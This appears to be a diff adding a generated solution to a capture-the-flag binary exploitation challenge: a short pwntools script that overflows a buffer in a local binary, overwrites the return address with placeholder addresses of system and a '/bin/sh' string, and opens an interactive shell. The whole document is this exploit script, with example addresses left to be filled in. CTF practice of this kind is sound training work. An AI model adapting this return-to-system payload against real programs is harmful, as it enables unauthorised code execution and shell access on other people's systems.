@@ -1,0 +1,23 @@
+code(prefix='To solve this CTF pwn challenge, we need to exploit the buffer overflow vulnerability in the `vulnerable_function`. We will use the `pwntools` library to craft the payload and interact with the binary. The goal is to overwrite the return address on the stack with the address of the `system` function and pass it the string "/bin/sh" to spawn a shell.', imports='from pwn import *', code='binary_path = \'./vulnerable_binary\'
+
+# Start the process
+io = process(binary_path)
+
+# Find the offset to the return address
+offset = cyclic_find(0x61616161)  # Example offset, replace with actual offset
+
+# Get the address of system and "/bin/sh"
+system_addr = p32(0x08048430)  # Example address, replace with actual address
+bin_sh_addr = p32(0x08048500)  # Example address, replace with actual address
+
+# Craft the payload
+payload = b\'A\' * offset
+payload += system_addr
+payload += b\'B\' * 4  # Padding for return address of system
+payload += bin_sh_addr
+
+# Send the payload
+io.sendline(payload)
+
+# Interact with the shell
+io.interactive()')
